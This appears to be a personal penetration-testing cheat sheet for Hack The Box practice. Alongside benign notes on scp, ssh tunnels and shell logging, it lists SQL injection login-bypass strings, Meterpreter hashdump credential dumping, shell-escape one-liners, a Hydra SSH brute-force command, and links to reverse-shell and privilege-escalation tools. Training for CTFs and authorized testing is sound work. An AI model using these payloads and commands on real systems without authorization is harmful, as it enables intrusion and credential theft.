# Pentest

## How to Use the Script for nmap of HTB boxes
1. Create script on local system or use wget
2. Chmod +x script
3. Run script like this (MUST HAVE SUDO)
```
sudo ./autonamp.sh -c <Computer_Name_from_HTB> -i <IP Address of Box from HTB>
```
4. Once ran, navigate to ~/HTB/<boxname> and your results will be there.

## Linux Initial Foothold Steps
- id
- sudo -l
- whoami
- uname -a
- ip -br a
- cat /etc/passwd

## Windows Initial Foothold Steps (using Meterpreter)
- load kiwi
- hashdump

## FTP Common Login
- User: anonymous
- Password: password

Type the word 'binary' without quotes then press Enter then can upload files as need be.

## SQL Injection
`admin' --`<br>`admin' #`<br>`admin'/*`<br>`' or 1=1--`<br>`' or 1=1#`<br>`' or 1=1/*`<br>`') or '1'='1--`<br>`') or ('1'='1--`

## Reverse Shells
[https://www.revshells.com/](https://www.revshells.com/)

## Simple Ways to Gain Shells
| Program | Code |
| ----------- | ----------- |
| Vi | :!bash |
| Vi | :set shell=/bin/bash:shell |
| awk | awk 'BEGIN {system("/bin/bash")}' |
| perl | perl -e 'exec "/bin/bash";' |
| find | find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \; |

## Linux Enumeration
[https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum) - Few years old yet solid script<br>
[https://github.com/NullArray/RootHelper](https://github.com/NullArray/RootHelper) - Robust solution to Linux Enumeration<br>
[https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) - Linpeas for Linux

## Windows Enumeration Links
[https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) - also privesc<br>
[https://github.com/411Hall/JAWS](https://github.com/411Hall/JAWS)<br>
[https://github.com/pentestmonkey/windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)
[https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
[https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

## Logging Scripts for Pentest
Autocreate a script to record Command Line interactions
```
test "$(ps -ocommand= -p $PPID | awk '{print $1}')" == 'script' || (script -f $HOME/$(date +"%d-%b-%y_%H-%M-%S")_shell.log)
```

NEW (Change IP)
```
PS1='[`date +"%d-%b-%y %T"`]\[\033[01;31m\] `DGTWINT=$(ip route get 192.168.1.1 | grep via | cut -f 5 -d " ") && FASTINT=$(grep ^ /dev/null /sys/class/net/*/speed 2> /dev/null | sort -t: -k 2 | tail -1 | cut -f 5 -d "/") && if [ -n "${DGTWINT}" ] ; then TESTINT="${DGTWINT}"; else TESTINT="${FASTINT}"; fi && IPADDR=$(ip addr show dev "${TESTINT}" | grep "inet " | sed -e "s/.*inet //" | cut -f 1 -d "/") && echo "${TESTINT:0:1}:${IPADDR}"`\[\033[00m\] \[\033[01;34m\]\W\[\033[00m\] > '
```

## Password Hashing and Cracking
[https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py](https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py) - Convert SSH keys to John the Ripper Keys<br>
[https://www.hackingarticles.in/password-crackingsmb/](https://www.hackingarticles.in/password-crackingsmb/) - SMB password cracking
  
## Encryption
[https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/) - Enter string and use the numerous encryptions on it<br>
[https://rot13.com/](https://rot13.com/) - Simplest form of encryption (can do more than just 13)

## Steganography
https://github.com/RickdeJager/stegseek - thousands times faster than than it's ancestor - Steghide<br>
https://github.com/Paradoxis/StegCracker - Finds passwords hidden with steganography
  
## Secure File Transfer - SCP
Create a Tunnel
```
ssh -N -L 8888:127.0.0.1:443 -i pemfile user@ip
```
SCP local to remote server - works best when placed in home directory on remote
```  
sudo scp -i pemfile /file/from/local/computer user@ip:/file/to/remote
```
SCP remote server to local - works best when placed in home directory on remote
```
sudo scp -i pemfile user@ip:/file/to/remote /where/to/store/locally
```
 
## GoBuster
```
gobuster dir -e -u http://<ip_address>:<port>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
  
## SMB Enumeration
```
enum4linux -a <ip_address> - Shows Users in SMB
```

## Hydra One-Liners
  SSH - Brute Force
```
sudo hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.174.2 -t 4 ssh
```
  
## Education / Learning / Practice
[https://picoctf.org/](https://picoctf.org/) - Simple, good to start with<br>
[https://www.vulnhub.com/](https://www.vulnhub.com/) - Easy once know how to setup properly due to different images<br>
[https://www.hackthebox.eu/](https://www.hackthebox.eu/) - the standard of Ethical Hacking Learning<br>
[https://www.immersivelabs.online/signin](https://www.immersivelabs.online/signin) - Free with edu email account<br>
[http://www.ronbert.com/OSI.htm](http://www.ronbert.com/OSI.htm) - Everyone's "favorite" OSI model<br>
[https://packetlife.net/library/cheat-sheets/](https://packetlife.net/library/cheat-sheets/) - Cheat sheets

## My Favorite Links
[https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) - More info on payloads than you can shake a stick at<br>
[Payload All the Things Reverse Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) - Probably the most useful thing on this sheet for HTB.<br>


